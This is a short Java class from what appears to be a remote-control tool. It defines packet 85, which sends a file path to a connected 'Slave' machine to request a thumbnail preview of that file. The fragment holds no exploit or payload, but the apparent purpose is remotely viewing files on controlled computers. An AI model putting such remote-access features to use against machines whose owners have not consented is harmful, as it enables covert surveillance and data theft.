package com.redpois0n.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.Slave;

public class Packet85ThumbnailPreview extends AbstractOutgoingPacket {

	private String file;
	
	public Packet85ThumbnailPreview(String file) {
		this.file = file;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(file);
	}

	@Override
	public byte getPacketId() {
		return 85;
	}

}
